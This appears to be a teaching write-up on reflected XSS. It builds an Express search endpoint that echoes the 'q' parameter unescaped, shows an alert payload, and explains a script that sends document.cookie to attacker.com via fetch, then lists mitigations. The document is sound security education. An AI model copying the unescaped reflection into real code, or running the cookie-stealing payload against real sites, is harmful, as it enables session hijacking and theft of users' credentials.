### Reflected XSS Demostration

To demonstrate a Reflected Cross-Site Scripting (XSS) vulnerability, we can create a simple web application where user inputs are reflected in the response without proper sanitization or escaping. Here's how we can structure the demonstration:

#### 1. Setup a Vulnerable Web Application
Create a basic server and a webpage that reflects user input.

**Example Code (Node.js with Express):**

```javascript
const express = require('express');
const app = express();

// Serve static files from the public directory
app.use(express.static('public'));

// Vulnerable endpoint
app.get('/search', (req, res) => {
    const query = req.query.q || ''; // Get 'q' parameter from URL
    res.send(`
        <html>
            <head>
                <title>Search Page</title>
            </head>
            <body>
                <h1>Search Results</h1>
                <p>Your query: ${query}</p> <!-- Vulnerable reflection -->
                <form action="/search" method="get">
                    <input type="text" name="q" placeholder="Enter search query">
                    <button type="submit">Search</button>
                </form>
            </body>
        </html>
    `);
});

// Start server
app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
```

#### 2. Test the Application
Open the web application in a browser: `http://localhost:3000/search`.  
Enter any search query (e.g., "test") in the search bar, and the query will be reflected in the response, such as:

```bash
Your query: test
```

### 3. Exploit the Vulnerability
Inject a script payload in the query parameter:

Open the following URL in the browser:

```bash
http://localhost:3000/search?q=<script>alert('XSS')</script>
```

### 4. Observe the Effect
The browser will execute the injected script, displaying an alert box with the message `XSS`.

### Why is this Vulnerable?
- User input (`q` parameter) is directly inserted into the HTML response without escaping or sanitization.
- This allows malicious code to be executed in the victim's browser.

### Mitigation

- **Escape User Input:** Use libraries or frameworks to escape special characters like `<`, `>`, `&`, etc.

Example in Node.js:

```javascript
const escapeHtml = (str) => 
    str.replace(/&/g, '&amp;')
       .replace(/</g, '&lt;')
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;')
       .replace(/'/g, '&#039;');

res.send(`
    <html>
        <head><title>Search Page</title></head>
        <body>
            <h1>Search Results</h1>
            <p>Your query: ${escapeHtml(query)}</p>
        </body>
    </html>
`);
```

- **Content Security Policy (CSP):** Implement a CSP header to restrict the sources of scripts.
- **Validate and Sanitize Input:** Reject or sanitize any suspicious input at the server side.

This demonstration effectively showcases how reflected XSS works and its impact when user input is not handled properly.

## URL Explanation

### Base URL:
`http://localhost:3000/search`: This is the search endpoint of a web application running on localhost:3000.

### Query Parameter:
`q=<script>fetch('https://attacker.com/steal?data='+document.cookie)</script>`: The `q` parameter contains a malicious JavaScript payload:
- `<script>...</script>`: The script tags encapsulate JavaScript code, making the browser execute it when the payload is reflected on the page.

### Malicious Code:
```javascript
fetch('https://attacker.com/steal?data='+document.cookie)
```

### Malicious Code Explanation

- **`fetch()` Function:** Sends an HTTP request to the attacker-controlled server (`https://attacker.com/steal`).
- **Query Parameter (`?data=`):** Appends the current user's cookies (`document.cookie`) to the request, effectively sending them to the attacker.

### What Happens When the URL is Visited?

#### Injection and Reflection:
- The web application reflects the `q` parameter's content (the `<script>` tag) directly back into the HTML response without sanitization or encoding.

#### Script Execution:
- The browser sees the `<script>` tag and executes the JavaScript payload.
- The `fetch()` call runs in the victim's browser, using their session and credentials.

#### Cookie Theft:
- `document.cookie` contains cookies belonging to `localhost:3000` (e.g., session tokens).
- These cookies are sent to `https://attacker.com/steal`.

### Why Doesn’t SOP Stop This?

The **Same-Origin Policy (SOP)** ensures that:
- JavaScript running in one origin (e.g., `localhost:3000`) cannot access sensitive resources (cookies, storage, DOM) from another origin (e.g., `attacker.com`).

However:
- SOP does not restrict outgoing requests.
- The malicious script running on `localhost:3000` can freely send requests to external servers, including `attacker.com`.
- The browser prevents reading the response from `attacker.com` due to SOP, but this is irrelevant in this case because the attacker's goal is to receive the cookies via the request itself.

#### `document.cookie` Belongs to the Current Origin (`localhost:3000`):
- The script has full access to cookies for the origin it executes under.
- Since the script runs on `localhost:3000`, it can freely access `document.cookie` for that origin.

### Why Is This Dangerous?

- **Session Hijacking:** Cookies often include session tokens. If an attacker obtains them, they can impersonate the user.
- **Persistent Exploits:** The attacker can exploit users visiting the URL without needing further interaction.
- **Trust Exploitation:** The attack abuses the trust users place in a legitimate website (`localhost:3000`) by executing malicious actions under its domain.

### Mitigations Against Reflected XSS

- **Escape User Input in HTML Contexts:** Escape special characters like `<`, `>`, and `"` in reflected user input to prevent script execution.

- **Content Security Policy (CSP):** Use CSP headers to disallow inline scripts:
    ```http
    Content-Security-Policy: script-src 'self';
    ```

- **SameSite Cookies:** Use the `SameSite` cookie attribute to restrict cookies from being sent with cross-site requests:
    ```http
    Set-Cookie: session=abc123; SameSite=Strict;
    ```

By addressing these vulnerabilities, we can significantly reduce the risk of XSS attacks.
